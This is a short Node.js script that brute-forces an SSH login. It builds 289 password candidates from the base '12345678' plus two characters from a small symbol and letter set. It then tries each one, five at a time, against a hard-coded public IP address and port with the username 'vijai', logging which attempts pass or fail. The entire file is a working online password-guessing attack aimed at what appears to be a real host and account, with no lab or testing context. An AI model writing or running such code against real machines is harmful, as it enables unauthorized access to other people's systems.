const { readFileSync } = require('fs');
//cons eachOfLimit from 'async/eachOfLimit';
const as = require('async');
const { Client } = require('ssh2');

var test = ['!', "@", "#", "$", "Q", "q", "^","|", "V", "v", "I","i", "*", "P", "p", "M","m" ]
var str = "12345678"
var list = [];
for (var i = 0; i < test.length; i++) {
    for (var j = 0; j < test.length; j++) {
        list.push(str + '' + test[i]+test[j]);
    }
    //list.push(str + '' + String.fromCharCode(i))
}


as.eachOfLimit(list, 5, run);

function run(item, key, callback) {
    const conn = new Client();

    conn.on('ready', () => {
      
       
        // conn.exec('uptime', (err, stream) => {
        //     if (err) throw err;
        //     stream.on('close', (code, signal) => {
        //         console.log('Stream :: close :: code: ' + code + ', signal: ' + signal);
        //         conn.end();
        //     }).on('data', (data) => {
        //         console.log('STDOUT: ' + data);
        //     }).stderr.on('data', (data) => {
        //         console.log('STDERR: ' + data);
        //     });
        // });
        console.log(' :::::::::::::::::::::::::::::::::: ');
        console.log('&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& :: ready');
        
        console.log(`${key} Passed: ${item}`)
        console.log('==================================');
        callback()
    }).on('error', (err) => {
        console.log(`${key} Failed: ${item}`)
        callback()
      }).connect({
        host: '111.93.8.126',
        port: 3012,
        username: 'vijai',
        password: item
    });
}

